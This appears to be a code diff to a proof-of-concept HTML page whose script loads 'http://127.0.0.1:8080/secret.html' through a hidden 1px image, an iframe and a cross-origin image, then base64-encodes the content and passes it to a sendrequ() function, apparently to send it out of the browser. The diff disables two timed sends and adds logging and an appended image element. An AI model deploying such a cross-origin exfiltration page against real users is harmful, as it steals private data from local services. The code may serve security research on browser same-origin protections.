@@ -62,15 +62,17 @@ function getFrameContents(){
 	    xmlHttp.send(null);
 	}
 	*/
-	setTimeout(function(){sendrequ(getBase64Image(document.getElementById("ttt")));}, 5000);
-	setTimeout(function(){sendrequ(getFrameContents());}, 5000);
+	//setTimeout(function(){sendrequ(getBase64Image(document.getElementById("ttt")));}, 5000);
+	//setTimeout(function(){sendrequ(getFrameContents());}, 5000);
 	
     var i = new Image();
     i.crossOrigin = "Anonymous";
 	i.src = "http://127.0.0.1:8080/secret.html";
 	i.onload = function(){
+		console.log("loaded img");
 		sendrequ(getBase64Image(i));
 	};
+	document.body.appendChild(i);
     </script>
     <img id="ttt" src="http://127.0.0.1:8080/secret.html" style="width:1px;height:1px;" onload="sendrequ(getBase64Image(document.getElementById("ttt")))">
     <iframe id="testf" src="http://127.0.0.1:8080/secret.html" onload="sendrequ(getFrameContents())"></iframe>
